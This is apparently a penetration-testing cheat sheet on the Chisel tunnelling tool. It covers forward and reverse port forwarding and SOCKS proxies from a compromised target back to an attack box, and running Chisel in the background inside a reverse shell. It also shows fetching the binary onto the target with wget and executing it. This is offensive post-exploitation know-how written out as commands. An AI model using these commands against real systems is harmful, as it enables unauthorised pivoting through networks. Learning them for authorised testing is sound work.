---
description: Port Forwarding using Chisel Pivoting using Chisel
---

# Chisel

## Chisel

### **Requirements** <a href="#bkmrk-usage" id="bkmrk-usage"></a>

Requires a copy of the Chisel binary on both the target and attacker systems.

### **Advantages** <a href="#bkmrk-chisel-advantages" id="bkmrk-chisel-advantages"></a>

* Chisel is a portable binary that can be run on many operating systems
  * Either system can host the chisel server on a chosen TCP port
  * Allows for a high amount of flexibility in situations where restrictions on connectivity exist
* No dependencies on SSH daemons/services running on the target
* Supports authenticated proxies to prevent unwanted connections.

### **Individual Port Forwarding** <a href="#bkmrk-individual-port-forw" id="bkmrk-individual-port-forw"></a>

Example: A service on a compromised host is listening on `$RPORT`

1. Run the Chisel server on the target and connect from the attack box
2. Specify the port forward on the client
3. Open a port on attack box and forward traffic to remote port

```bash
# Target Machine
./chisel server --port $SERV_PORT

# Attack Machine
./chisel client $targetIP:$SERV_PORT $LHOST:$LPORT:$RHOST:$RPORT
```

Open `$LPORT` on attack box and port forward to `$RPORT` on target

### **Reverse Individual Port Forwarding** <a href="#bkmrk-reverse-local-port-t" id="bkmrk-reverse-local-port-t"></a>

Example: A service on a compromised host is listening on `$LPORT`

1. Run the Chisel server on the attack box in **reverse mode** and connect from the target
2. Specify the port forward on the target machine
3. Open a port on attack box and forward traffic to remote port

```bash
# Attack Machine
./chisel server --reverse --port $SERV_PORT

# Target Machine
./chisel client $attackIP:$SERV_PORT R:$RPORT:$LHOST:$LPORT
```

Open `$RPORT` on attack box and forward to `$LPORT` on target through reverse connection.

### **Socks Proxy** <a href="#bkmrk-chisel-server-runnin" id="bkmrk-chisel-server-runnin"></a>

#### **Server Running on Attack Box** <a href="#bkmrk-chisel-server-runnin" id="bkmrk-chisel-server-runnin"></a>

```bash
# Attack Machine
./chisel server --reverse --port 51234

# Target Machine
./chisel client $AttackIP:51234 R:127.0.0.1:54321:socks
```

Opens port 54321 on attack box as a reverse SOCKS proxy. Listens for connections from Chisel on this port.

#### **Chisel Server Running on Target** <a href="#bkmrk-chisel-server-runnin-0" id="bkmrk-chisel-server-runnin-0"></a>

```bash
# Target Machine
./chisel server --socks5 --port 51234

# Attack Machine
./chisel client $targetIP:51234 54321:socks
```

Open port 54321 on attack machine as a forward SOCKS proxy

#### **Forward Dynamic SOCKS Proxy** <a href="#bkmrk-forward-dynamic-sock" id="bkmrk-forward-dynamic-sock"></a>

1. Run the Chisel server on the target box
2. Use the target box as a jump host to reach additional targets routable by the target

The traffic flows forward to the target box, which acts as a transparent SOCKS proxy

```bash
# Target Machine
./chisel server --socks5 --port $SERV_PORT

# Attack Machine
./chisel client $targetIP:$SERV_PORT $LPORT:socks
```

#### **Reverse Dynamic SOCKS Proxy** <a href="#bkmrk-reverse-dynamic-sock" id="bkmrk-reverse-dynamic-sock"></a>

1. Run the Chisel server on the attack box in reverse mode
2. Connect to the Chisel server from the target and specify a reverse port forward

The traffic flows through the port on the attack box in reverse to the target box, which acts as a transparent SOCKS proxy

```
# Attack Machine
./chisel server --reverse --port $SERV_PORT

# Target Machine
./chisel client $attackIP:$SERV_PORT R:127.0.0.1:$LPORT:socks
```

### **Reverse Shell Tips** <a href="#bkmrk-reverse-shell-tips" id="bkmrk-reverse-shell-tips"></a>

#### **Run Chisel in the Background** <a href="#bkmrk-run-chisel-in-the-ba" id="bkmrk-run-chisel-in-the-ba"></a>

Running `chisel` in the foreground in a reverse shell will render your shell useless. Background the process in order to continue to use the shell while forwarding traffic.

**Linux**

Background a process with '`&`'. Works for both client and server sides.

```bash
chisel server --port 8080 --reverse &
```

**Windows - PowerShell**

**Client Side**

```powershell
# Use the Start-Job cmdlet with a script block
$background = { Start-Process C:\Windows\Temp\chisel.exe -ArgumentList @('client','10.0.0.2:8080','R:127.0.0.1:8800:127.0.0.1:80') }
Start-Job -ScriptBlock $background
```

**Server Side**

Note that in `server` mode, you'll need to make sure your port is allowed through the firewall.

```powershell
# Use the Start-Job cmdlet with a script block
$background = { Start-Process C:\Windows\Temp\chisel.exe -ArgumentList @('server','--port 50001','--socks5') }
Start-Job -ScriptBlock $background
```

## Port Forwarding using Chisel <a href="#port-forwarding-using-chisel" id="port-forwarding-using-chisel"></a>

[Chisel](https://github.com/jpillora/chisel) is a fast TCP/UDP tunnel over HTTP. Is can be used for port forwarding.

### Transfer Chisel Binary to Remote Machine <a href="#transfer-chisel-binary-to-remote-machine" id="transfer-chisel-binary-to-remote-machine"></a>

If the remote machine does not have chisel binary, we need to transfer it from local machine (if local machine has the binary).

```
# In local machine
python3 -m http.server --directory /path/to/chisel/directory

# In remote machine
wget http://<local-ip>:8000/chisel
chmod +x chisel
./chisel -h
```

### Port Forwarding <a href="#port-forwarding" id="port-forwarding"></a>

```
# In remote machine
chisel server -p <listen-port>

# In local machine
chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
```

### Reverse Port Forwarding <a href="#reverse-port-forwarding" id="reverse-port-forwarding"></a>

It is useful when we want to access to the host & the port that cannot be directly accessible from local machine.

```
# In local machine
chisel server -p 9999 --reverse

# In remote machine
# replace 10.0.0.1 with your local ip
chisel client 10.0.0.1:9999 R:8090:172.16.22.2:8000
```

After that, we can access to **`http://localhost:8090/`** in local machine. In short, we can access to **`http://172.16.22.2:8000/`** via **`localhost:8090`**.\
Try **`curl`** to confirm.

```
curl http://localhost:8090

# The result is the content of http://172.16.22.2:8000/
```

#### Example (SSH) <a href="#example-ssh" id="example-ssh"></a>

Assume we want to connect to SSH server (**`ssh://172.17.0.1:22`**) that cannot be directly accessed from local machine.

```
# In local machine
chisel server -p 9999 --reverse

# In remote machine (assume we want to connect ssh://172.17.0.1:22)
chisel client <local-ip>:9999 R:2222:172.17.0.1:22
```

After that, we can connect to the SSH server from local machine.\
Run the following command in local machine.

```
ssh user@localhost -p 2222
```

#### Forward Multiple Ports <a href="#forward-multiple-ports" id="forward-multiple-ports"></a>

```
# In local machine
chisel server -p 9999 --reverse

# In remote machine
chisel client 10.0.0.1:9999 R:3000:127.0.0.1:3000 R:8000:127.0.0.1:8000
```

After that, we can access to **`http://localhost:3000`** and **`http://localhost:8000`** in local machine.

### Forward Dynamic SOCKS Proxy <a href="#forward-dynamic-socks-proxy" id="forward-dynamic-socks-proxy"></a>

```
# In remote
chisel server -p 9999 --socks5

# In local
chisel client 10.0.0.1:9999 8000:socks
```

Then modify **`/etc/proxychains.conf`** in local machine.\
Comment out the line of **"socks4"**.

```
# /etc/proxychains.conf
...
socks5 127.0.0.1  8000
```

### Reverse Dynamic SOCKS Proxy <a href="#reverse-dynamic-socks-proxy" id="reverse-dynamic-socks-proxy"></a>

It is useful when we want to access to the host & multiple ports that cannot be directly accessible from local machine.

```
# In local machine
chisel server -p 9999 --reverse --socks5

# In remote machine
chisel client 10.0.0.1:9999 R:socks
```

After connected, see the chisel server log:

```
2024/09/01 00:00:00 server: session#3: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Note the 127.0.0.1:1080 and we can paste it for SOCKS proxy settings such as proxhchains and Burp.

Modify **`/etc/proxychains.conf`** in local machine.\
Comment out the line of **"socks4"**.

```
# /etc/proxychains.conf
...
socks5 127.0.0.1 1080
```

To confirm if we can reach the desired host and port, run **nmap** with **proxychains**.

```
proxychains nmap localhost
```

#### Enable Proxychains Bash <a href="#enable-proxychains-bash" id="enable-proxychains-bash"></a>

It allows us to execute programs without adding **proxychains** command before main command.

```
proxychains bash

# Run some command without "proxychains" command.
nmap localhost
```

#### Burp Suite Settings for Proxy <a href="#burp-suite-settings-for-proxy" id="burp-suite-settings-for-proxy"></a>

If we want to use **Burp Suite** with **proxychains**, we can add the **SOCKS** proxy in the Proxy settings.\
For details, please see the [SOCKS Proxy in Burp Suite](https://exploit-notes.hdks.org/exploit/web/tool/socks-proxy-in-burpsuite/).

### References

* [https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)
